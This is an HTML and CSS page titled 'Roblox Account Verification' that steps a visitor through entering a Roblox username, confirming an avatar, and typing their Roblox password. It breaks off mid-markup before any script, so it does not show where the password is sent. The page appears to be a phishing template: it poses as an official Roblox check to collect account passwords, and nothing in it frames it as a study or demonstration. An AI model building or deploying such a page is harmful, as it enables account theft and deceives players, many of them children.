<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Account Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            font-size: 28px;
            color: #fff;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }
        
        .logo p {
            color: #aaa;
            margin-top: 10px;
            font-size: 14px;
        }
        
        .step {
            display: none;
            animation: fadeIn 0.5s ease;
        }
        
        .step.active {
            display: block;
        }
        
        h2 {
            font-size: 22px;
            margin-bottom: 20px;
            color: #fff;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #ddd;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border-radius: 8px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        
        input:focus {
            outline: none;
            border-color: #4285f4;
            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
        }
        
        .btn {
            display: block;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: #4285f4;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .btn:hover {
            background: #3367d6;
            transform: translateY(-2px);
        }
        
        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
        }
        
        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.2);
        }
        
        .user-info {
            display: flex;
            align-items: center;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            margin-right: 15px;
            border: 2px solid #4285f4;
        }
        
        .user-details h3 {
            font-size: 18px;
            margin-bottom: 5px;
        }
        
        .user-details p {
            color: #aaa;
            font-size: 14px;
        }
        
        .terms-link {
            text-align: center;
            margin-top: 20px;
        }
        
        .terms-link a {
            color: #4285f4;
            text-decoration: none;
            font-size: 14px;
        }
        
        .terms-link a:hover {
            text-decoration: underline;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: #1a1a2e;
            width: 90%;
            max-width: 600px;
            border-radius: 15px;
            padding: 30px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .modal-header h2 {
            margin: 0;
        }
        
        .close-btn {
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
        }
        
        .modal-body {
            line-height: 1.6;
            color: #ddd;
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        
        .checkbox-group input {
            width: auto;
            margin-right: 10px;
        }
        
        .checkbox-group label {
            margin: 0;
        }
        
        .success-message {
            text-align: center;
            padding: 20px;
        }
        
        .success-message i {
            font-size: 50px;
            color: #4caf50;
            margin-bottom: 20px;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .error-message {
            color: #f44336;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid #4285f4;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .no-internet {
            text-align: center;
            padding: 20px;
            display: none;
        }
        
        .no-internet i {
            font-size: 50px;
            color: #f44336;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Verify with Roblox</h1>
            <p>Secure account verification system</p>
        </div>
        
        <!-- No Internet Message -->
        <div class="no-internet" id="no-internet">
            <i>⚠</i>
            <h2>No Internet Connection</h2>
            <p>You need internet to enter verification. Please check your connection and try again.</p>
        </div>
        
        <!-- Step 1: Username Input -->
        <div class="step active" id="step1">
            <h2>Enter Your Roblox Username</h2>
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" placeholder="Enter your Roblox username">
                <div class="error-message" id="username-error">Please enter a valid Roblox username</div>
            </div>
            <button class="btn" id="check-username">Check Username</button>
            <div class="loading" id="loading1">
                <div class="spinner"></div>
                <p>Checking username...</p>
            </div>
            <div class="terms-link">
                <a href="#" id="terms-link">Terms and Conditions</a>
            </div>
        </div>
        
        <!-- Step 2: User Confirmation -->
        <div class="step" id="step2">
            <h2>Is This You?</h2>
            <div class="user-info">
                <img src="" alt="Avatar" class="avatar" id="user-avatar">
                <div class="user-details">
                    <h3 id="display-name">Username</h3>
                    <p id="user-id">ID: 123456789</p>
                </div>
            </div>
            <button class="btn" id="confirm-user">Yes, This Is Me</button>
            <button class="btn btn-secondary" id="change-user">No, Change Username</button>
        </div>
        
        <!-- Step 3: Password Input -->
        <div class="step" id="step3">
            <h2>Enter Your Password</h2>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your Roblox password">
                <div class="error-message" id="password-error">Please enter your password</div>
            </div>
            <button class="btn" id="submit-password">Continue</button>
            <button class="btn btn-secondary" id="back-to-confirm">Back
